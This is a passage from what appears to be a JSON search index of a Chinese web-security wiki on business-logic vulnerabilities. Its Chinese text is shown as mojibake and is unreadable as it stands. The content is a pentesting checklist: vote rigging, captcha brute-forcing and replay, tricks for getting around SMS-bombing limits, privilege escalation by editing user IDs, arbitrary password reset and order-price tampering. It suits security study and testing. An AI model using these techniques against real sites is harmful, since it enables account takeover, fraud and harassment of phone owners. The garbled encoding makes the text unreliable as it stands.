ä¹Ÿæœ‰ä¸€éƒ¨åˆ†åº”ç”¨éœ€è¦ç™»é™†ä»¥åæ‰èƒ½æŠ½å¥–æˆ–è€…æŠ•ç¥¨ï¼Œè¿™ç±»å¯ä»¥ç»“åˆçœ‹çœ‹èƒ½ä¸èƒ½æ‰¹é‡æ³¨å†Œï¼Œå¦‚æœå¯ä»¥ï¼Œåˆ™å¯ä»¥ç”¨ç¨‹åºå®ç°æ‰¹é‡ç™»é™†åˆ·ç¥¨ï¼Œæˆ–è€…æŠ•ç¥¨çš„æ—¶å€™POSTåŒ…æˆ–è€…cookieé‡Œé¢çš„å½“å‰uid\\ ç”¨æˆ·åç­‰æ˜¯å¦å¯ä»¥éšæ„ä¿®æ”¹ç»•è¿‡ç”¨æˆ·å•æ¬¡é™åˆ¶ã€‚ é˜²å¾¡æ–¹æ³•ä»ä¸Šé¢åˆ©ç”¨æ‰‹æ®µå¯ä»¥çœ‹åˆ°ä¸»è¦çš„ä¸‰ä¸ªç‚¹æ˜¯IPã€ç™»å½•ç”¨æˆ·å’Œcookieã€åˆ†æå‡ºå¯ç”¨æ€§è¾ƒé«˜çš„é˜²å¾¡ æ‰‹æ®µå¦‚ä¸‹ï¼š Ã˜ æœºå™¨è¯†åˆ«ç éªŒè¯ï¼Œæ¯å°æœºå™¨éƒ½å¯ä»¥æ ¹æ®ç¡¬ä»¶ä¿¡æ¯ç”Ÿæˆå”¯ä¸€çš„è¯†åˆ«ç ã€‚ Ã˜ æ“ä½œéœ€è¦ç™»é™†ï¼Œå½“å‰ç”¨æˆ·ä¿¡æ¯ä»sessionä¸­è¯»å–ã€‚"},{"title":"CORS","path":"/wiki/WebçŸ¥è¯†ç‚¹/CORS.html","content":"CORS æ›´æ–°: 2025-10-30 16:41:59åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/py1kigwbspmyezds"},{"title":"æŒ–æ˜æµç¨‹","path":"/wiki/WebçŸ¥è¯†ç‚¹/é€»è¾‘è¶Šæƒ/æŒ–æ˜æµç¨‹.html","content":"é€»è¾‘æ¼æ´æŒ–æ˜é€»è¾‘æ¼æ´#é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘è¾“å…¥ç®¡æ§ä¸ä¸¥æˆ–è€…é€»è¾‘å¤ªå¤æ‚ï¼Œå¯¼è‡´ç¨‹åºä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œé€»è¾‘æ¼æ´æ ¹æ®åŠŸèƒ½éœ€æ±‚çš„ä¸åŒäº§ç”Ÿçš„æ¼æ´æ–¹å¼ä¹Ÿä¸åŒã€‚ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç¨‹åºçš„ç™»å½•æ³¨å†Œã€å¯†ç æ‰¾å›ã€éªŒè¯æ–¹å¼ã€ä¿¡æ¯æŸ¥çœ‹ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰åœ°æ–¹ã€‚ è¿™ç±»æ¼æ´ä¸åŒäºå¸¸è§WEBæ¼æ´ï¼Œå¸¸è§WEBæ¼æ´éƒ½å¯ä»¥æ€»ç»“ä¸ºä¸€å®šçš„èŒƒå¼ï¼Œè€Œé€»è¾‘æ¼æ´ä¸è¡Œ é€»è¾‘æ¼æ´å‡ºç°çš„åŸå› ä¹Ÿæ˜¯æœ‰å¾ˆå¤šç§ï¼Œéœ€è¦æœ‰ä¸€å®šä¸ªäººç»éªŒç§¯ç´¯æ‰èƒ½åœ¨ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­å‘ç°æ­¤ç±»æ¼æ´ æŒ–æ˜æ€è·¯#é¦–å…ˆå°†æ‰€æœ‰é€»è¾‘æ¼æ´çš„é—®é¢˜åˆ†ä¸ºå‰ç«¯å’Œåç«¯ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…ˆæµ‹è¯•ç»•è¿‡å‰ç«¯è§„åˆ™é™åˆ¶å†æµ‹è¯•ç»•è¿‡åç«¯è§„åˆ™é™åˆ¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªè¦èƒ½å¤Ÿçªç ´åŸæœ‰è§„åˆ™é™åˆ¶çš„éƒ½å°±å¯ä»¥ç®—æ˜¯æ¼æ´ã€‚ æŒ–æ˜é€»è¾‘æ¼æ´æ€»ä½“æ­¥éª¤åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥ï¼š æ˜ç¡®ä¸šåŠ¡é€»è¾‘æµç¨‹ï¼Œæ ¹æ®ä¸šåŠ¡éœ€æ±‚çš„ç‰¹ç‚¹ï¼Œæœ‰é’ˆå¯¹æ€§çš„è¿›è¡Œæµ‹è¯•ã€‚ å¯»æ‰¾æµç¨‹ä¸­å¯ä»¥è¢«æ“æ§çš„ç¯èŠ‚ï¼Œåˆ†æå¯è¢«æ“æ§ç¯èŠ‚ä¸­å¯èƒ½äº§ç”Ÿçš„é€»è¾‘é—®é¢˜ã€‚ ç å®ä¿®æ”¹å‚æ•°è§¦å‘é€»è¾‘é—®é¢˜ï¼Œé‡æ”¾åŒ…å¯¹æ¯”ç»“æœå·®å¼‚ã€‚ ä¸šåŠ¡é€»è¾‘æ¼æ´#- ç™»å½•æ¨¡å—# æš´åŠ›ç ´è§£ ä»»æ„ç”¨æˆ·å¯†ç ç™»é™† çŸ­ä¿¡é‚®ç®±è½°ç‚¸ éªŒè¯ç ç»•è¿‡çˆ†ç ´é‡æ”¾å›ä¼  ç”¨æˆ·åæ‰‹æœºå·æšä¸¾ è¶Šæƒç™»é™†ï¼ˆä¾‹å¦‚ä¿®æ”¹æ•°æ®åŒ…ä¸­ç”¨æˆ·IDï¼‰ è´¦å·æƒé™ç»•è¿‡ï¼ˆè¶Šæƒï¼‰ Cookieä¼ªé€  ç”¨æˆ·ç©ºå¯†ç ç™»é™† æ³¨å†Œæ¨¡å—# å‰ç«¯éªŒè¯ç»•è¿‡ ç”¨æˆ·ä»»æ„æ‰¹é‡æ³¨å†Œ æ¶æ„éªŒè¯æ³¨å†Œè´¦æˆ· è´¦æˆ·é‡å¤æ³¨å†Œ ç”¨æˆ·åç»‘å®šæ‰‹æœºå·æšä¸¾ æ³¨å†Œä¿¡æ¯æ’å…¥XSS çŸ­ä¿¡é‚®ç®±è½°ç‚¸ éªŒè¯ç ç»•è¿‡çˆ†ç ´é‡æ”¾å›ä¼  å…¶ä»–éªŒè¯æœºåˆ¶ç»•è¿‡ å¯†ç æ‰¾å›# ä»»æ„æ‰¹é‡ç”¨æˆ·å¯†ç é‡ç½® ä»»æ„é‚®ç®±æ‰‹æœºå·éªŒè¯ï¼ˆéªŒè¯ç ä¸ç»‘å®šç”¨æˆ·æœªç»Ÿä¸€éªŒè¯ï¼‰ ç”¨æˆ·ç»‘å®šæ‰‹æœºå·æšä¸¾ æ–°å¯†ç åŠ«æŒ çŸ­ä¿¡éªŒè¯ç åŠ«æŒç»•è¿‡å›ä¼ çˆ†ç ´é‡æ”¾ ç”¨æˆ·é‚®ç®±åŠ«æŒç¯¡æ”¹ å…¶ä»–éªŒè¯æœºåˆ¶ç»•è¿‡ è´­ä¹°æ”¯ä»˜å……å€¼# å•†å“é‡‘é¢æ•°é‡ç¯¡æ”¹ æ›¿æ¢æ”¯ä»˜æ¨¡å— äº¤æ˜“ä¿¡æ¯æ³„éœ² è™šå‡å……å€¼é‡‘é¢ å……å€¼è´¦æˆ·é‡‘é¢æ•°é‡ç¯¡æ”¹ æ”¯ä»˜éªŒè¯ç»•è¿‡ æ•´æ•°æº¢å‡ºï¼Œintæœ€å¤§å€¼ä¸º2147483647 ä¿®æ”¹æœ¬åœ°JSæˆ–æœåŠ¡ç«¯è¿”å›çš„æ•°æ®åŒ…ä¸­çš„å…³é”®å€¼ ä¸ªäººèµ„æ–™# æ‰‹æœºå·ç”¨æˆ·é‚®ç®±æšä¸¾ ä¿®æ”¹ä¸ªäººèµ„æ–™æ’å…¥XSS é‚®ç®±ç”¨æˆ·æ‰‹æœºå·ç¯¡æ”¹ ç”¨æˆ·ä¿¡æ¯éå†æ³„éœ² è¶Šæƒä¿®æ”¹ä»–äººè´¦æˆ·èµ„æ–™ æŠ½å¥–æ´»åŠ¨# ä»»æ„æŠ½å¥– ç›—åˆ·å¥–å“ç§¯åˆ† æŠ½å¥–ç§¯åˆ†æ¬¡æ•°ç¯¡æ”¹ å¹¶å‘æŠ½å¥– é‚€è¯·ç XSSï¼ˆéªŒè¯ç URLå¯èƒ½åŒ…å«ç”¨æˆ·åï¼Œå¯å°†ç”¨æˆ·åä¿®æ”¹ä¸ºXSSä»£ç ï¼‰ ä»£é‡‘åˆ¸ä¼˜æƒ åˆ¸# æ‰¹é‡åˆ·å–ä»£é‡‘åˆ¸ä¼˜æƒ åˆ¸ æ›´æ”¹ä»£é‡‘åˆ¸é‡‘é¢æ•°é‡ æ›´æ”¹ä¼˜æƒ åˆ¸æ•°é‡ å¹¶å‘é€»è¾‘æ¼æ´ï¼ˆburpæ‰¹é‡è·å–ä¼˜æƒ åŠµç­‰ï¼‰ è®¢å•# è®¢å•ä¿¡æ¯éå†æ³„éœ² è®¢å•ä¿¡æ¯æ³„éœ²å¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² è¶Šæƒä¿®æ”¹åˆ é™¤ä»–äººè®¢å• è´¦æˆ·# è´¦æˆ·éªŒè¯ç»•è¿‡ è´¦æˆ·é‡‘é¢ç¯¡æ”¹ è´¦æˆ·ç»‘å®šæ‰‹æœºå·ç»•è¿‡ è´¦æˆ·ç¬¬ä¸‰æ–¹è´¦æˆ·ç»‘å®šç»•è¿‡ ä¼šå‘˜ç³»ç»Ÿ# ç”¨æˆ·è¶Šæƒæ“ä½œè®¿é—® ä¸ªäººèµ„æ–™ä¿¡æ¯éå†æ³„éœ² ä¿®æ”¹ä¸ªäººä¿¡æ¯å¤´åƒä¸Šä¼ ä»»æ„æ–‡ä»¶ å¦‚æœé‡åˆ°xlsxdocxï¼Œå¯èƒ½å­˜åœ¨XXEï¼Œä¸Šä¼ æ¶æ„æ–‡æ¡£ç›²æµ‹ ä¿®æ”¹ä¸ªäººä¿¡æ¯é¡µé¢æ’å…¥XSS ä¼ è¾“è¿‡ç¨‹# POSTCookieæ³¨å…¥ cookieåŠ«æŒ ä¿®æ”¹ä¿¡æ¯å¤„æ— sessiontokenå¯¼è‡´CSRF æ˜æ–‡ä¼ è¾“è´¦å·å¯†ç  è¯„è®ºæ¨¡å—# POSTæ³¨å…¥ æ— sessiontokenå¯¼è‡´CSRF è¯„è®ºæ—¶æ’å…¥XSS éå†ç”¨æˆ·IDå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ² æ¶æ„æ‰¹é‡åˆ·è¯„è®ºæ•°é‡ ç¬¬ä¸‰æ–¹ç³»ç»Ÿ# ç¬¬ä¸‰æ–¹ç³»ç»Ÿæœªæˆæƒè®¿é—® ç¬¬ä¸‰æ–¹è´¦æˆ·ä¿¡æ¯éå† ç¬¬ä¸‰æ–¹è´¦æˆ·è¶Šæƒè®¿é—® ç¬¬ä¸‰æ–¹è´¦æˆ·ä¿¡æ¯æ³„éœ² ç¬¬ä¸‰æ–¹åº”ç”¨ç‰ˆæœ¬æ¼æ´ éªŒè¯ç å®‰å…¨# éªŒè¯ç å‚æ•°åˆ é™¤ç»•è¿‡ éªŒè¯ç ç”Ÿæˆè§„å¾‹é¢„æµ‹ éªŒè¯ç å›¾åƒå†…å®¹å¯è¢«å·¥å…·è¯†åˆ« éªŒè¯ç é•¿æœŸä¸å¤±æ•ˆï¼Œè¿›è¡Œçˆ†ç ´ éªŒè¯ç å›æ˜¾åˆ°é¡µé¢æˆ–è€…æ•°æ®åŒ…ä¸­ å•ä¸ªéªŒè¯ç å¯å¤šæ¬¡é‡å¤åˆ©ç”¨ çŸ­ä¿¡éªŒè¯ç ä¸æ‰‹æœºå·æœªç»Ÿä¸€éªŒè¯ çŸ­ä¿¡éªŒè¯ç æœªå¯¹å•ä¸ªæ‰‹æœºå·å‘é€æ¬¡æ•°è¿›è¡Œé™åˆ¶ çŸ­ä¿¡éªŒè¯ç æœªåšå‘é€æ—¶é—´é™åˆ¶ï¼Œå¯¼è‡´çŸ­ä¿¡è½°ç‚¸ å¯èƒ½å­˜åœ¨ä¸‡èƒ½éªŒè¯ç  æ¥å£è°ƒç”¨# æœªæˆæƒè®¿é—®æ•æ„Ÿæ•°æ®æ¥å£ çŸ­ä¿¡apiæ¥å£æ³„éœ²è¢«æ¶æ„è°ƒç”¨ æ•°æ®åº“æ¥å£æ³„éœ²ï¼Œå¯¼è‡´æ•°æ®å¯è¢«æ¶æ„æ“ä½œ é€»è¾‘æ¼æ´åˆ©ç”¨#éªŒè¯ç #ä¸‡èƒ½éªŒè¯ç ï¼š ç¨‹åºå‘˜åœ¨å¼€å‘éªŒè¯ç æ¨¡å—æ—¶ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒç”¨éªŒè¯ç éªŒè¯åŠŸèƒ½æ˜¯å¦å®Œå–„ï¼Œæ•…æ„è®¾ç½®äº†å‡ ä¸ªä¸‡èƒ½çš„éªŒè¯ç ä½œä¸ºæµ‹è¯•æ•°æ®ã€‚åœ¨å¼€å‘ç»“æŸåç”±äºç¨‹åºå‘˜çš„ç–å¿½ï¼Œæ²¡æœ‰åˆ é™¤è¯¥æµ‹è¯•éªŒè¯ç æ•°æ®ä»è€Œå¯¼è‡´è¯¥æ¼æ´çš„äº§ç”Ÿã€‚ éªŒè¯ç å›ä¼ ï¼š é€šè¿‡æŠ“åŒ…çš„æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ°éªŒè¯ç å†…å®¹å›æ˜¾åœ¨äº†æ•°æ®åŒ…ä¸­ï¼›æˆ–è€…é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç å¯ä»¥çœ‹åˆ°éªŒè¯ç ä¸­çš„å†…å®¹ï¼Œå¯¼è‡´æ­£ç¡®éªŒè¯ç å¯ä»¥è¢«ç›´æ¥è¯»å–åˆ©ç”¨åˆ°ã€‚ åˆ é™¤éªŒè¯ç ç»•è¿‡ï¼š é€šè¿‡æŠ“åŒ…å°†éªŒè¯ç çš„å€¼åˆ é™¤æˆ–è€…ç›´æ¥åˆ é™¤éªŒè¯ç å‚æ•°ï¼Œç„¶åå°†ä¿®æ”¹åçš„æ•°æ®åŒ…è¿›è¡Œé‡æ”¾å¯¼è‡´éªŒè¯ç éªŒè¯è¢«ç»•è¿‡ã€‚ éªŒè¯ç çˆ†ç ´ï¼š æ­¤å¤„éªŒè¯ç çˆ†ç ´é€šå¸¸æ˜¯æŒ‡æ‰‹æœºçŸ­ä¿¡éªŒè¯çš„æ–¹å¼ï¼Œç”±äºæ²¡æœ‰å¯¹è¾“å…¥åŒä¸€ä¸ªéªŒè¯ç çš„æ¬¡æ•°åšé™åˆ¶ï¼Œå¹¶ä¸”éªŒè¯ç çš„å†…å®¹å¤ªç®€å•ï¼Œä¾‹å¦‚4ä½æˆ–è€…6ä½çš„çº¯æ•°å­—ç»„æˆã€‚å¯ä»¥é€šè¿‡Burpçš„Intruderæ¨¡å—å¯¹éªŒè¯ç å†…å®¹è¿›è¡Œçˆ†ç ´ï¼Œç›´åˆ°åŒ¹é…åˆ°æ­£ç¡®çš„éªŒè¯ç ã€‚ éªŒè¯ç é‡æ”¾ é¦–å…ˆï¼Œè¾“å…¥é”™è¯¯çš„éªŒè¯ç ï¼Œè¿›è¡ŒæŠ“åŒ…é‡æ”¾ä¸€æ¬¡ï¼Œè§‚å¯ŸéªŒè¯çš„è¿”å›çš„æ•°æ®åŒ…å†…å®¹ï¼Œå†ç”¨æ­£ç¡®çš„éªŒè¯ç å†è¿›è¡ŒæŠ“åŒ…é‡æ”¾ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ•°æ®åŒ…çš„å·®å¼‚ï¼Œç„¶åæ ¹æ®è¿™äº›å·®å¼‚éªŒè¯ç æ˜¯å¦å¤±æ•ˆã€‚ ç„¶åå°†æ­£ç¡®çš„éªŒè¯ç å‘é€è‡³Burpçš„Intruderæ¨¡è¿›è¡Œä¸æ–­çš„é‡æ”¾ï¼Œæ¯”è¾ƒè¿™äº›æ•°æ®åŒ…æ˜¯å¦éƒ½æ˜¯æ­£ç¡®éªŒè¯ç æ—¶è¿”å›çš„ä¸€æ ·å†…å®¹ï¼Œå¦‚æœæ•°æ®åŒ…å†…å®¹ä¸€æ ·è¯´æ˜å­˜åœ¨éªŒè¯ç é‡æ”¾çš„æ¼æ´ã€‚ éªŒè¯ç ä¸æ‰‹æœºå·æœªç»Ÿä¸€åŒ¹é… é¦–å…ˆç”¨è‡ªå·±çš„æ‰‹æœºæ”¶åˆ°æ­£ç¡®éªŒè¯ç ï¼Œåœ¨ç‚¹å‡»æ³¨å†Œæ—¶æ‹¦æˆªåŒ…å°†æ‰‹æœºå·æ”¹ä¸ºå…¶ä»–æ‰‹æœºå·ï¼Œå¦‚æœæˆåŠŸçš„è¯å°±æ³¨å†Œäº†åˆ«äººçš„æ‰‹æœºå·ï¼Œè¿™æ˜¯å› ä¸ºåç«¯ä»…éªŒè¯äº†éªŒè¯ç æ˜¯å¦æ˜¯æ­£ç¡®çš„è€Œæ²¡æœ‰éªŒè¯éªŒè¯ç æ˜¯å¦ä¸æ‰‹æœºåŒ¹é…ã€‚ çŸ­ä¿¡è½°ç‚¸#å°è¯•ä¸æ–­é‡æ”¾å‘é€éªŒè¯ç çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ‰‹æœºæ˜¯å¦åœ¨çŸ­æ—¶é—´å†…æ”¶åˆ°äº†å¤šæ¡çŸ­ä¿¡ï¼Œæ˜¯çš„è¯åˆ™å­˜åœ¨çŸ­ä¿¡è½°ç‚¸æ¼æ´ï¼Œè¿™æ˜¯å› ä¸ºåç«¯æ²¡æœ‰å¯¹å‘é€æ‰‹æœºçŸ­ä¿¡åšæ—¶é—´æ¬¡æ•°é™åˆ¶ã€‚ å¦‚æœåç«¯å¯¹çŸ­ä¿¡éªŒè¯ç åšäº†é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä»¥ä¸‹å‡ ç§æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š åˆ é™¤ä¿®æ”¹cookieæˆ–è€…è¿”å›å€¼ï¼Œé‡æ”¾æ•°æ®åŒ… éå†å‚æ•°å‘é€æ•°æ®åŒ… å¯¹å‚æ•°è¿›è¡Œå åŠ  æ‰‹æœºå·åé¢åŠ ç©ºæ ¼(%20)æˆ–è€…å‰é¢åŠ å…¶ä»–çš„æ¯”å¦‚+86ã€é€—å·ã€åˆ†å·ã€å­—æ¯ç­‰ è¯·æ±‚å‚æ•°ä¿®æ”¹å¤§å°å†™ï¼Œæˆ–è€…æ·»åŠ è¯·æ±‚å‚æ•°id1 å¤šæ¥å£æµ‹è¯•ï¼Œå¯èƒ½ç™»é™†ä½ç½®åšäº†é˜²æŠ¤ï¼Œä½†å¯†ç æ‰¾å›å‡ºæ²¡æœ‰é˜²æŠ¤ åˆ©ç”¨è°ƒç”¨æ¥å£ç»•è¿‡çŸ­ä¿¡è½°ç‚¸é™åˆ¶ ä¿®æ”¹IPç»•è¿‡çŸ­ä¿¡è½°ç‚¸é™åˆ¶ æ·»åŠ é‡å¤çš„æ‰‹æœºå·å‚æ•°ï¼Œé‡æ”¾æ•°æ®åŒ… è¶Šæƒæ“ä½œ#é¦–å…ˆç”¨ä¸€ä¸ªè´¦å·ç™»é™†ç³»ç»Ÿåï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·å‚æ•°ï¼Œå¯ä»¥è¾¾åˆ°æŸ¥çœ‹æˆ–è€…ä¿®æ”¹ä»–äººè´¦å·çš„ç›®çš„ï¼Œå°½é‡å¯¹å¤šæ¥å£æˆ–è€…å¤šåŠŸèƒ½æ¨¡å—è¿›è¡Œä¸æ–­æµ‹è¯•è¶Šæƒæ“ä½œã€‚åŒæ—¶ä¹Ÿè¦å¤šä¸ªè´¦å·ç™»é™†ï¼Œåˆ†æå¯¹æ¯”è¿™äº›è´¦å·æ•°æ®åŒ…ä¸­çš„è¯·æ±‚å‚æ•°å·®å¼‚ï¼Œé€šè¿‡ä¿®æ”¹è¿™äº›å­˜åœ¨å·®å¼‚çš„å‚æ•°ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿè¾¾åˆ°è¶Šæƒæ“ä½œçš„ç›®çš„ã€‚ è¶Šæƒæ¼æ´åˆåˆ†ä¸ºå¹³è¡Œè¶Šæƒï¼Œå‚ç›´è¶Šæƒå’Œäº¤å‰è¶Šæƒã€‚ å¹³è¡Œè¶Šæƒï¼šæƒé™ç±»å‹ä¸å˜ï¼Œæƒé™IDæ”¹å˜ å‚ç›´è¶Šæƒï¼šæƒé™IDä¸å˜ï¼Œæƒé™ç±»å‹æ”¹å˜ äº¤å‰è¶Šæƒï¼šå³æ”¹å˜IDï¼Œä¹Ÿæ”¹å˜æƒé™ ç”¨æˆ·ä¿¡æ¯æ³„éœ²#å¯èƒ½å­˜åœ¨ç”¨æˆ·ä¸ªäººä¿¡æ¯é¡µé¢ã€å¯†ç æ‰¾å›å¤„ä»¥åŠå„ç§è°ƒç”¨åˆ°ç”¨æˆ·ä¿¡æ¯æ•°æ®çš„åœ°æ–¹ï¼Œé€šè¿‡æŠ“åŒ…æŸ¥çœ‹è¿”å›ä¿¡æ¯æ˜¯å¦åŠ è½½äº†ä¸€äº›æ•æ„Ÿçš„æ•°æ®ä¿¡æ¯ï¼Œæ¯”å¦‚æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™ä¹Ÿå°†ç”¨æˆ·çš„å¯†ç æ•°æ®åœ¨æ•°æ®åŒ…ä¸­å›æ˜¾äº†ï¼›æˆ–è€…åœ¨ç”¨æˆ·ä¸ªäººèµ„æ–™é¡µé¢ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·IDå‚æ•°ï¼Œå¯ä»¥é€šè¿‡éå†æŸ¥è¯¢åˆ°å…¶ä»–è´¦å·çš„ç”¨æˆ·èµ„æ–™ï¼Œå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ³„éœ²ï¼› ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®#é€šå¸¸å‘ç”Ÿåœ¨å¿˜è®°å¯†ç å¤„ï¼Œç”±äºç³»ç»Ÿæ²¡æœ‰ä¸¥æ ¼åŒ¹é…ç”¨æˆ·å¿˜è®°å¯†ç æ—¶çš„éªŒè¯æ–¹å¼ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ç”¨æˆ·å‚æ•°ï¼Œå¯¼è‡´ä»»æ„ç”¨æˆ·çš„å¯†ç éƒ½èƒ½å¤Ÿè¢«é‡ç½®ã€‚ æ¯”å¦‚æŸä¸ªå¿˜è®°å¯†ç åŠŸèƒ½å¤„é‡‡ç”¨æ‰‹æœºå·çŸ­ä¿¡éªŒè¯çš„æ–¹å¼æ¥é‡ç½®ç”¨æˆ·å¯†ç ï¼Œå¦‚æœè¯¥éªŒè¯æ‰‹æœºå·æ²¡æœ‰å¯¹ç”¨æˆ·è´¦æˆ·è¿›è¡Œç»‘å®šï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¾“å…¥ä»»æ„æ‰‹æœºå·æ¥æ”¶çŸ­ä¿¡éªŒè¯ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨è¯¥éªŒè¯ç é‡ç½®ç”¨æˆ·å¯†ç äº†ã€‚ è®¢å•é‡‘é¢ä»»æ„ä¿®æ”¹#å¾ˆå¤šä¸­å°å‹çš„è´­ç‰©ç½‘ç«™éƒ½å­˜åœ¨è®¢å•é‡‘é¢ä»»æ„ä¿®æ”¹æ¼æ´ã€‚åœ¨æäº¤è®¢å•çš„æ—¶å€™æŠ“å–æ•°æ®åŒ…æˆ–è€…ç›´æ¥ä¿®æ”¹å‰ç«¯ä»£ç ï¼Œç„¶åå¯¹è®¢å•çš„é‡‘é¢ä»»æ„ä¿®æ”¹ã€‚ ç»å¸¸è§åˆ°çš„å‚æ•°å¤§å¤šä¸ºï¼šrmb ã€value ã€amount ã€cash ã€fee ã€money ç­‰ å…³äºæ”¯ä»˜çš„é€»è¾‘æ¼æ´è¿™ä¸€å—è¿˜æœ‰å¾ˆå¤šç§æ€è·¯ï¼Œæ¯”å¦‚ç›¸åŒä»·æ ¼å¢åŠ è®¢å•æ•°é‡ï¼Œç›¸åŒè®¢å•æ•°é‡å‡å°‘äº§å“ä»·æ ¼ï¼Œè®¢å•ä»·æ ¼è®¾å®šä¸ºè´Ÿæ•°ç­‰ç­‰ã€‚ æœªæˆæƒè®¿é—®#æœ‰äº›ä¸šåŠ¡çš„æ¥å£ï¼Œå› ä¸ºç¼ºå°‘äº†å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯çš„è¾ƒéªŒæˆ–è€…æ˜¯éªŒè¯å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´é»‘å®¢å¯ä»¥æœªç»æˆæƒè®¿é—®è¿™äº›æ•æ„Ÿä¿¡æ¯ç”šè‡³æ˜¯è¶Šæƒæ“ä½œã€‚ ä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æ–‡ä»¶å¯¼å‡ºä¸‹è½½ï¼ŒJSONæ•°æ®é¡µé¢ï¼Œç¬¬ä¸‰æ–¹åº”ç”¨é¡µé¢ç­‰ä½ç½®ã€‚ å¸¸è§æ¡ˆä¾‹ï¼š æŸç”µå•†åå°ä¸»é¡µé¢ï¼Œç›´æ¥åœ¨ç®¡ç†å‘˜webè·¯å¾„åé¢è¾“å…¥main.phpä¹‹ç±»çš„å³å¯è¿›å…¥ã€‚ æŸèˆªç©ºå…¬å¸è®¢å•IDæšä¸¾ æŸç”µå­è®¤è¯ä¸­å¿ƒæ•æ„Ÿæ–‡ä»¶ä¸‹è½½ æŸç«™è¶Šæƒæ“ä½œåŠç¼ºé™·ï¼Œå…¶ä¸»è¦åŸå› æ˜¯æ²¡å¯¹IDå‚æ•°åšcookieéªŒè¯å¯¼è‡´ å®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šæ¡ˆä¾‹ï¼Œä»–ä»¬éƒ½å­˜åœ¨ä¸€ä¸ªå…±åŒçš„ç‰¹æ€§ï¼Œå°±æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯è¿›è¡Œæ•ˆéªŒ æ¥å£æ— é™åˆ¶æšä¸¾#æœ‰äº›å…³é”®æ€§çš„æ¥å£å› ä¸ºæ²¡æœ‰åšéªŒè¯æˆ–è€…å…¶å®ƒé¢„é˜²æœºåˆ¶ï¼Œå®¹æ˜“é­åˆ°æšä¸¾æ”»å‡»ã€‚ å¸¸è§æ¡ˆä¾‹ï¼š æŸç”µå•†ç™»é™†æ¥å£æ— éªŒè¯å¯¼è‡´æ’åº“ æŸæ‹›è˜ç½‘éªŒè¯ç æ— é™åˆ¶æšä¸¾ æŸå¿«é€’å…¬å¸ä¼˜æƒ åˆ¸æšä¸¾ æŸç”µå•†ä¼šå‘˜å¡å¡å·æšä¸¾ æŸè¶…å¸‚æ³¨å†Œç”¨æˆ·ä¿¡æ¯è·å– cookietokenè®¾è®¡å­˜åœ¨ç¼ºé™·#cookieçš„æ•ˆéªŒå€¼è¿‡äºç®€å•ã€‚æœ‰äº›webå¯¹äºcookieçš„ç”Ÿæˆè¿‡äºå•ä¸€æˆ–è€…ç®€å•ï¼Œå¯¼è‡´é»‘å®¢å¯ä»¥å¯¹cookieçš„æ•ˆéªŒå€¼è¿›è¡Œä¸€ä¸ªæšä¸¾ã€‚æˆ–è€…é€šè¿‡ä¿®æ”¹cookieä¸­çš„æŸä¸ªå‚æ•°å¯ä»¥ç™»é™†å…¶ä»–ç”¨æˆ·ï¼Œå³cookieä»¿å†’ã€‚ tokenä¸€èˆ¬æ˜¯æ“ä½œä»¤ç‰Œï¼Œæ¯ä¸ªç”¨æˆ·åœ¨ç™»å½•ç³»ç»Ÿæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªç”¨æˆ·ç”Ÿæˆtokenä»¤ç‰Œä½œä¸ºæ“ä½œå‡­è¯ã€‚å¦‚æœtokenè®¾è®¡å¤ªè¿‡äºç®€å•ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šè¢«ç ´è§£ï¼›æˆ–è€…tokenæ²¡æœ‰è®¾ç½®è¿‡æœŸçš„æ—¶é—´ï¼Œä½¿å¾—ç”¨æˆ·tokenä¸å”¯ä¸€ï¼Œå¯¼è‡´ç”¨æˆ·tokenå­˜åœ¨è¢«ç›—ç”¨çš„é£é™©ã€‚ æ‰¾å›å¯†ç å­˜åœ¨è®¾è®¡ç¼ºé™·#authè®¾è®¡ç¼ºé™· ç»å¸¸ç ”ç©¶é€»è¾‘æ¼æ´çš„äººå¯èƒ½ä¼šå¯¹ä»¥ä¸‹URLå¾ˆç†Ÿæ‚‰ www.xxx.com/resetpassword.php?id=MD5 ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ï¼Œé‚®ç®±ä¸­ä¼šæ”¶åˆ°ä¸€ä¸ªå«æœ‰authçš„é“¾æ¥ï¼Œåœ¨æœ‰æ•ˆæœŸå†…ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼Œå³å¯è¿›å…¥é‡ç½®å¯†ç 